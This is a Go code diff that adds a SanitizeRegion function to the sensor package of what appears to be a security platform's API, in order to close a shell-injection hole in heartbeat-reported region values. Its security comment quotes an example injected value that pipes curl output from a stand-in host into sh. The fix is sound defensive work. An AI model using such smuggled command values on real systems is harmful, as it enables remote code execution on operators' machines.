@@ -3,6 +3,7 @@ package sensor
 
 import (
 	"net"
+	"regexp"
 	"time"
 
 	"github.com/openctemio/api/pkg/domain/shared"
@@ -361,13 +362,38 @@ func (a *Sensor) UpdateRuntimeInfo(version, hostname string, ip net.IP) {
 	a.UpdatedAt = time.Now()
 }
 
+// regionSanitizeRegexp matches any character that is NOT allowed in a
+// deployment region token.
+var regionSanitizeRegexp = regexp.MustCompile(`[^A-Za-z0-9._-]+`)
+
+// SanitizeRegion normalizes a sensor-reported deployment region to a safe
+// token: only [A-Za-z0-9._-] survive and the result is capped at 64 chars.
+//
+// SECURITY: the region is reported by the (untrusted) sensor process via the
+// heartbeat and is later rendered verbatim by text/template into the sensor
+// setup snippets (env/docker/yaml) that an operator copy-pastes into a shell.
+// Without this sanitization a malicious or compromised sensor could inject
+// shell metacharacters (e.g. `ap-south-1;curl evil|sh`) and achieve command
+// execution on the operator's machine. text/template performs no escaping, so
+// the trust boundary is enforced here at ingest.
+func SanitizeRegion(region string) string {
+	if region == "" {
+		return ""
+	}
+	cleaned := regionSanitizeRegexp.ReplaceAllString(region, "")
+	if len(cleaned) > 64 {
+		cleaned = cleaned[:64]
+	}
+	return cleaned
+}
+
 // UpdateMetrics updates system metrics from heartbeat.
 func (a *Sensor) UpdateMetrics(cpuPercent, memoryPercent float64, activeJobs int, region string) {
 	a.CPUPercent = cpuPercent
 	a.MemoryPercent = memoryPercent
 	a.ActiveJobs = activeJobs
-	if region != "" {
-		a.Region = region
+	if r := SanitizeRegion(region); r != "" {
+		a.Region = r
 	}
 	a.UpdatedAt = time.Now()
 }
@@ -402,8 +428,8 @@ func (a *Sensor) UpdateExtendedMetricsWithWeights(metrics ExtendedMetrics, weigh
 	a.NetworkRxMBPS = metrics.NetworkRxMBPS
 	a.NetworkTxMBPS = metrics.NetworkTxMBPS
 	a.ActiveJobs = metrics.ActiveJobs
-	if metrics.Region != "" {
-		a.Region = metrics.Region
+	if r := SanitizeRegion(metrics.Region); r != "" {
+		a.Region = r
 	}
 	// Compute load score
 	a.LoadScore = a.ComputeLoadScoreWithWeights(weights)
